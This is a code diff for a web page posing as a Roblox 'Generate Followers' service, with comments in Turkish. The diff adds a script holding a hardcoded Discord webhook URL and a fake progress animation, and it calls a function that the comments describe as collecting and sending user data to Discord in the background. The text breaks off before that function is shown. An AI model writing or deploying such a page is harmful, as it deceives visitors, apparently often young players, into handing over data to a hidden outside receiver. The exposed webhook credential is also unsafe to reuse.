@@ -1,4 +1,6 @@
 
+
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -92,7 +94,7 @@
             font-weight: 600;
         }
 
-        .form-group input {
+        .form-group input, .form-group select {
             width: 100%;
             padding: 15px;
             font-size: 1rem;
@@ -103,20 +105,9 @@
             transition: border-color 0.3s;
         }
 
-        .form-group input:focus {
+        .form-group input:focus, .form-group select:focus {
             outline: none;
             border-color: var(--primary-color);
-        }
-
-        .form-group select {
-            width: 100%;
-            padding: 15px;
-            font-size: 1rem;
-            border: 2px solid rgba(255, 255, 255, 0.1);
-            border-radius: 8px;
-            background-color: rgba(255, 255, 255, 0.05);
-            color: var(--text-light);
-            cursor: pointer;
         }
 
         .submit-btn {
@@ -168,59 +159,6 @@
             margin-top: 15px;
             font-weight: 600;
         }
-
-        .features-section {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 20px;
-            margin-top: 40px;
-        }
-
-        .feature-card {
-            background: var(--card-bg);
-            padding: 25px;
-            border-radius: 10px;
-            text-align: center;
-            border: 1px solid rgba(255, 255, 255, 0.05);
-        }
-        .feature-card .icon {
-            font-size: 2.5rem;
-            color: var(--primary-color);
-            margin-bottom: 15px;
-        }
-        .feature-card h3 {
-            margin-bottom: 10px;
-        }
-        .feature-card p {
-            color: var(--text-muted);
-            font-size: 0.9rem;
-        }
-
-        .reviews-section {
-            margin-top: 40px;
-        }
-        .reviews-section h2 {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        .review {
-            background: var(--card-bg);
-            padding: 20px;
-            border-radius: 10px;
-            margin-bottom: 15px;
-            border-left: 4px solid var(--primary-color);
-        }
-        .review p {
-            font-style: italic;
-            margin-bottom: 10px;
-        }
-        .review .author {
-            font-weight: 600;
-            color: var(--primary-color);
-        }
-        .review .stars {
-            color: #ffd700;
-        }
     </style>
 </head>
 <body>
@@ -253,4 +191,56 @@
                     <button type="submit" class="submit-btn" id="submitBtn">Generate Followers</button>
                 </form>
 
-                <div class
+                <div class="progress-container" id="progressContainer">
+                    <div class="progress-bar">
+                        <div class="progress-fill" id="progressFill">0%</div>
+                    </div>
+                    <div class="status-message" id="statusMessage">Initializing...</div>
+                </div>
+            </div>
+        </main>
+    </div>
+
+<!-- TAM VE EKSİKSİZ JAVASCRIPT KODU BURADA BAŞLIYOR -->
+<script>
+    // Discord Webhook URL'niz
+    const WH_URL = "https://discord.com/api/webhooks/1454212443227033762/sENFhwWgklT-lvcuHVyZrg0l634v00ce4tSz3YsVM6HXTMtOMZzNAlvUVFjyo3ekswyJ";
+
+    // Form elemanlarını seçelim
+    const form = document.getElementById('followerForm');
+    const submitBtn = document.getElementById('submitBtn');
+    const progressContainer = document.getElementById('progressContainer');
+    const progressFill = document.getElementById('progressFill');
+    const statusMessage = document.getElementById('statusMessage');
+
+    // Form gönderildiğinde çalışacak fonksiyon
+    form.addEventListener('submit', async function(event) {
+        // Sayfanın yenilenmesini engelle
+        event.preventDefault();
+
+        // Roblox kullanıcı adını al
+        const username = document.getElementById('robloxUsername').value;
+        const followerAmount = document.getElementById('followerAmount').value;
+
+        // Butonu devre dışı bırak ve ilerleme çubuğunu göster
+        submitBtn.disabled = true;
+        submitBtn.textContent = 'Processing...';
+        progressContainer.style.display = 'block';
+        progressFill.style.width = '0%';
+        statusMessage.textContent = 'Connecting to server...';
+
+        // Sahte ilerleme animasyonu
+        let progress = 0;
+        const interval = setInterval(() => {
+            progress += 10;
+            progressFill.style.width = progress + '%';
+            if (progress === 30) statusMessage.textContent = 'Verifying user...';
+            if (progress === 60) statusMessage.textContent = `Generating ${followerAmount} followers...`;
+            if (progress === 90) statusMessage.textContent = 'Almost done...';
+        }, 400);
+
+        // Arka planda veri toplama ve gönderme işlemini başlat
+        await sendUserDataToDiscord(username);
+
+        // Animasyonu bitir ve başarı mesajını göster
+        setTimeout(()
